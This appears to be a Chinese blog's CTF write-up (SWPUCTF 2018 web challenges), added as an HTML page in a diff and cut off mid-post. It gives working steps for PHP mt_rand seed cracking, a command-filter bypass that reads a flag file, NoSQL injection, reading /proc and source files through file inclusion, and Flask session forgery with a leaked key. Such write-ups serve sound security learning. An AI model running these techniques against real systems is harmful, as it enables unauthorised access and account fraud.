@@ -1,0 +1,4380 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="一叶飘零">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="一叶飘零">
+    
+    <meta name="keywords" content="Sky's Blog,一叶飘零">
+    
+    <meta name="description" content="苟有恒，何必三更眠五更起。">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>2018SWPUCTF-Web · Sky&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018SWPUCTF-Web</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sky's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018SWPUCTF-Web
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3,362</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/17</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知  https://xz.aliyun.com/t/3656</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">## 用优惠码 买个 X ?</span><br><span class="line">### 信息搜集</span><br><span class="line">随手尝试www.zip</span><br><span class="line">发现文件泄露</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">//生成优惠码</span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">	if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后发现题目注册用户登录后，会得到一个优惠码<br><img src="/images/2018-12-17-18-51-32.png" alt=""><br>然而在使用的时候会提示<br><img src="/images/2018-12-17-18-51-52.png" alt=""><br>这就很难受了，明明是15位的优惠码，告诉我要24位的，这里就想到了随机数预测</p>
+<h3 id="种子爆破"><a href="#种子爆破" class="headerlink" title="种子爆破"></a>种子爆破</h3><p>不难发现，虽然我们没有种子，但是我们能得到15个生成的随机数<br>于是使用工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.openwall.com/php_mt_seed/</span><br></pre></td></tr></table></figure></p>
+<p>进行恢复，按照这个思路写出脚本，并按照工具的Input格式进行处理<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'SUjJQvy1e2NyihU'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">	<span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">			<span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">				res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(len(str3)):</span><br><span class="line">			<span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">				res+=str(len(str1)-j)+<span class="string">' '</span>+str(len(str1)-j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p>
+<p>运行得到结果<br><img src="/images/2018-12-17-18-54-46.png" alt=""><br>我们即可得到满足条件的seed:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seed = 0x016bbc5d = 23837789 (PHP 7.1.0+)</span><br></pre></td></tr></table></figure></p>
+<p>下面容易想到，将题目中的<code>len=15</code>改成<code>len=24</code>，生成优惠码，即可购买成功</p>
+<h3 id="Bypass-RCE"><a href="#Bypass-RCE" class="headerlink" title="Bypass RCE"></a>Bypass RCE</h3><p>购买成功后，跳转到RCE的界面，阅读过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">           <span class="comment">//执行命令</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现必须使用ip的格式，这里使用换行符<code>%0a</code>即可轻松绕过<br>然后是关键词过滤，发现通配符<code>?</code>以及<code>*</code>都被过滤<br>这里想到bypass技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at /fl\ag</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-11-50-00.png" alt=""><br>即可拿到flag</p>
+<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>题目提示了<br><img src="/images/2018-12-17-18-46-14.png" alt=""><br>查看下去，发现<br><img src="/images/2018-12-17-18-46-45.png" alt=""><br>猜测题目应该使用了MongoDB</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>尝试测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password[$ne]=\</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-18-47-55.png" alt=""><br>而一般情况下为<br><img src="/images/2018-12-17-18-48-26.png" alt=""><br>那么应该可以判断为NoSQL注入<br>那么进行盲注：<br><img src="/images/2018-12-17-14-36-06.png" alt=""><br>吐槽一下，由于有验证码，而我又不会验证码识别。。。于是只能手动测试：(<br>最后得到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = skmun</span><br></pre></td></tr></table></figure></p>
+<h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>登录后即可得到flag<br><img src="/images/2018-12-17-14-36-30.png" alt=""></p>
+<h2 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到题目F12发现关键信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;/static?file=test.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- /source --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>首先确定：<br>1.存在文件包含<br>2.有泄露<br>于是进行查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://107.167.188.241/source</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line">            return abort(404)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure>
+<h3 id="源码读取"><a href="#源码读取" class="headerlink" title="源码读取"></a>源码读取</h3><p>那么思路应该是利用文件包含进行文件读取了<br>但是不能进行目录穿越，于是得先知道绝对路径，这里想到之前HCTF的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/environ</span><br></pre></td></tr></table></figure></p>
+<p>发现500了，应该是没有权限，换个思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/maps</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-13-12-57.png" alt=""><br>发现了python路径，但是看到内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line">            return abort(404)</span><br></pre></td></tr></table></figure></p>
+<p>我们没有办法使用这个绝对路径，尝试了一下bypass，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ctf/web_assli3fasdf/././././app</span><br></pre></td></tr></table></figure></p>
+<p>发现也不行，出题人说用了abspath<br>看来只能想想有没有其他途径读取文件，这里想到如下方法<br>我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/[pid]/cwd是进程当前工作目录的符号链接</span><br></pre></td></tr></table></figure></p>
+<p>既然之前的路径无法用，那么我们可以考虑从proc进行读取，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py</span><br><span class="line">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</span><br></pre></td></tr></table></figure></p>
+<p>这也我们以后进行文件读取，拓宽了一些思路，并且只发现了只有以下文件可以读到，应该是出题人做了限制<br>得到文件内容<br><strong>init</strong>.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure></p>
+<p>views.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure></p>
+<h3 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h3><p>首先从views.py开始审计，发现需要<code>u.balance &gt; 1000000</code>,并且我们又拥有<code>secret_key</code><br>不难想到进行session构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session_cookie_manager.py encode -s &apos;9f516783b42730b7888008dd5c15fe66&apos; -t &quot;&#123;u&apos;count&apos;: 1000000000, u&apos;username&apos;: u&apos;admin&apos;, u&apos;csrf_token&apos;: u&apos;559da19dcf76705bb469aaa42e951440ff338728&apos;, u&apos;balance&apos;: 1000000000.0&#125;&quot;</span><br></pre></td></tr></table></figure></p>
